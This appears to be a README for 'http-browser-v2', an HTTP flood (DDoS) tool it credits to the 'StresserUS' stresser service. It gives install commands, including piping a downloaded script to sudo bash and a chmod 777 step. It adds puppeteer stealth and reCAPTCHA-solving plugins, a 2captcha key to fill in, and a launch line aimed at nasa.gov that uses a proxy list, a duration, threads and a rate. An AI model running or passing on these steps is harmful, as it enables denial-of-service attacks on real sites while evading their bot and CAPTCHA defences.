# http-browser-v2
New Version of HTTP Browser


curl -sL https://deb.nodesource.com/setup_16.x | sudo bash -

sudo apt -y install nodejs

npm install puppeteer-extra puppeteer-extra-plugin-recaptcha puppeteer-extra-plugin-stealth

apt install chromium-browser -y

chmod 777 optls

node golang_engine.js https://nasa.gov proxy.txt 1200 20 GET 64

Change the 2captcha key on golang_engine

Method coded by Ch2k1t3 friend for StresserUS, released because we got hacked

Dont bully the code, the method was under development
